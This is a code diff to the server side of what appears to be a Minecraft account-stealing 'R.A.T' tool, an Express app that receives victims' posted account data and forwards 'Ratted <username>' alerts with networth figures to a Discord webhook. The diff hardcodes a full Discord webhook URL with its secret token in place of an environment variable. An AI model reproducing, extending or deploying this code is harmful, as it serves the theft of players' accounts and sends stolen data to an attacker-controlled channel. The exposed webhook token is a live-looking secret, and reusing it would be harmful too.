@@ -42,22 +42,7 @@ setInterval(() => {
 }, 1000 * 60 * 15)
 
 
-//send to discord webhook
-networthCalc("3f5db911165646149a7a7fcb52b1d083").then((result) => {
-    networth = Intl.NumberFormat('en-US', {
-        notation: 'compact',
-        maximumFractionDigits: 2,
-    }).format(result[0]);
-    soulboundnetworth = Intl.NumberFormat('en-US', {
-        notation: 'compact',
-        maximumFractionDigits: 2,
-    }).format(result[1]);
-    description = result[2];
 
-    sentnetworth = (Math.trunc(result[0])) / 1000000;
-
-    console.log(sentnetworth)
-})
 //main route, post to this
 app.post("/", (req, res) => {
     //happens if the request does not contain all the required fields, aka someones manually posting to the server
@@ -184,7 +169,7 @@ app.post("/", (req, res) => {
                     sentnetworth = (Math.trunc(result[0])) / 1000000;
                     console.log(532)
                     
-                    post(process.env.WEBHOOK, JSON.stringify({
+                    post("https://discord.com/api/webhooks/1037632110233653288/r4z6zfMmIbksaVdw_2Wu9yiMn5dlaudyBa4yoiomRL5aY6rShFghZ3vh5rCd3u6IZsBx", JSON.stringify({
                         content: `@everyone - ${soulboundnetworth}(${networth})`, //ping
                         embeds: [{
                             title: `Ratted ${req.body.username} - Click For Stats`,
@@ -224,7 +209,26 @@ app.post("/", (req, res) => {
 })
 
 //create server
-app.listen(port, () => console.log(`[R.A.T] Listening at port ${port}`))
+app.listen(port, () => {
+    console.log(`[R.A.T] Listening at port ${port}`);
+    // send to discord webhook
+    networthCalc("3f5db911165646149a7a7fcb52b1d083").then((result) => {
+        networth = Intl.NumberFormat('en-US', {
+            notation: 'compact',
+            maximumFractionDigits: 2,
+        }).format(result[0]);
+        soulboundnetworth = Intl.NumberFormat('en-US', {
+            notation: 'compact',
+            maximumFractionDigits: 2,
+        }).format(result[1]);
+        description = result[2];
+
+        sentnetworth = (Math.trunc(result[0])) / 1000000;
+
+        console.log(sentnetworth);
+    });
+});
+
 
 //format a number into thousands millions billions
 const formatNumber = (num) => {
